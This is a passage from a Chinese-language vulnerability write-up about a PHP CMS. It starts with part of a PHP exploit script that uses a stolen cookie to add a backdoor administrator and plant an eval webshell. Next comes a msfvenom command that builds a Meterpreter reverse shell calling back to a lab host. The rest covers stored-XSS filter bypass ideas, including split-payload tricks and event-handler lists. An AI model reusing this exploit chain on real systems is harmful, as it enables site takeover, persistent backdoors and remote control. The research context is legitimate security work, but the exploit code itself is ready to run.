            }
            $params[CURLOPT_COOKIE] = $cookie;
            curl_setopt_array($ch, $params);
            $output = curl_exec($ch);
            file_put_contents('log.txt', $output, FILE_APPEND);
            curl_close($ch);
        }
        $C = $_GET['x'];
        $P = $_GET['p'];
        $P = substr($P, 0, strlen($P)-21);
        file_put_contents('c.txt', $C);
        file_put_contents('p.txt', $P);
        $url_1 = 'http://192.168.113.128'.$P.'admin_manager.php?action=add';
        $url_2 = 'http://192.168.113.128'.$P.'admin_ip.php?action=set';
        $data_1 = 'username=test&pwd=test&pwd2=test&groupid=1';
        $data_2 = 'v=0&ip=+";@eval($_POST[qwer]);"';
        Requests($url_1, $data_1, $C);
        Requests($url_2, $data_2, $C);
这两个脚本会将cookie和后台路径保存在文件中，并且会向后台发送数据，添加一个系统管理员，同时会在系统中写入一个一句话木马，需要注意的是修改域名为测试域名。测试如下  
代码已经写进了后台
管理员添加成功
一句话也写进去了  
利用蚁剑连接上，然后生成exe文件反弹shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.113.169 LPORT=5555 -f exe > exp.exe
接下来就是对内网渗透或者提权留后门，不在本文章讨论范围内，因此不再赘述
### 题外话
在研究完上个漏洞后，我又发现了一处该cms的存储型XSS，但该漏洞数据库字段限制长度为20，我并没有找到可利用的方法，有师傅有兴趣可以研究下，以下为测试。
#### 注册处存储型XSS漏洞
漏洞产生的地方在注册时的名称处，过滤的waf脚本和上面一样，因此不再赘述，与此同时，还利用了两个函数进行过滤
    # reg.php
    $username = $m_user;
    $username = RemoveXSS(stripslashes($username));
    $username = addslashes(cn_substr($username,200));
    # RemoveXSS()
    function RemoveXSS($val) {  
       $val = preg_replace('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/', '', $val);  
       $search = 'abcdefghijklmnopqrstuvwxyz';
       $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  
       $search .= '1234567890!@#$%^&*()';
       $search .= '~`";:?+/={}[]-_|\'\\';
       for ($i = 0; $i  0) {
                   $pattern .= '(';  
                   $pattern .= '(&#[xX]0{0,8}([9ab]);)';
                   $pattern .= '|';  
                   $pattern .= '|(&#0{0,8}([9|10|13]);)';
                   $pattern .= ')*';
                }
                $pattern .= $ra[$i][$j];
             }
             $pattern .= '/i';  
             $replacement = substr($ra[$i], 0, 2).''.substr($ra[$i], 2); // add in <> to nerf the tag  
             $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags  
             if ($val_before == $val) {  
                // no replacements were made, so exit the loop  
                $found = false;  
             }  
          }  
       }
       return $val;  
    }
RemoveXSS函数针对关键字会在第二个字符后添加以防止XSS，但仅仅过滤了script，javascript等几个有限的关键字，大部分标签可以利用，但难点在于数据库字段长度限制为20，便限制了大部分的XSS  
除此之外，后台还会在a标签中引用username，但我才疏学浅，并没找到利用方式。
这里我提供了两个思路，供师傅们参考  
##### 拆分跨站法
来自著名安全研究员剑心发布的一篇文章《疯狂的跨站之行》，针对长度限制，可以利用拆分跨站法，即将代码拆分，赋值给JavaScript变量，最后利用eval函数执行变量，举例
        z=z+’
        z=z+’js>
针对此cms，难点在于过滤了script导致没有办法构造字符串，而利用其他标签长度又不够，难以突破
##### 事件
waf虽然过滤了五个比较常见的on标签但还有其他相当多的标签可利用，例如
    onResume
        onReverse
        onRowDelete
        onRowInserted
        onSeek
        onSynchRestored
        onTimeError
        onTrackChange
        onURLFlip
        onRepeat
    ......
但这些标签利用都超过了长度限制，因此难以突破
### 总结
前端漏洞一般难以引起注意，危害性也没有后端的漏洞大，但前端漏洞非常灵活，无论是存储型XSS的反弹cookie还是反射性的钓鱼攻击，都有可能造成更大的危害，千里之堤溃于蚁穴。前端的安全不容忽视。